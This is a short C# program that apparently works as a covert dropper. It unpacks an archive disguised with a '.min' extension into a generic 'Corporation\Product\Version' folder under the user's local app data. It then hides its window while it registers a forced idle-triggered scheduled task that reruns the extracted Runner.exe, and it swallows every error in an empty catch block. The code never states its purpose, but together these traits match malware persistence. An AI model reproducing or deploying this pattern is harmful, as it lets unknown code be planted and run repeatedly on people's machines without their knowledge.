using System;
using System.Management;
using System.Runtime.InteropServices;


namespace Runner
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string usr1 = System.Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = ("/create /SC ONIDLE /I 20 /F /TN " + '"' + "Scheduled Runner" + '"' + " /TR "+ usr1 + "\\Corporation\\Product\\Version\\Runner.exe");
                process.StartInfo = startInfo;

                string zipPath;
                if (args.Length > 0)
                {
                    string[] zipPath0 = Environment.GetCommandLineArgs();
                    zipPath = (zipPath0[1] + "prog_c.min");
                }
                else
                {
                    zipPath = @"prog_c.min";
                }
                string extractPath = (usr1 + "\\Corporation\\Product\\Version");
                System.IO.Directory.CreateDirectory(extractPath);
                System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, extractPath);
                process.Start();
            }
            catch
            {
            }
        }
    }
}
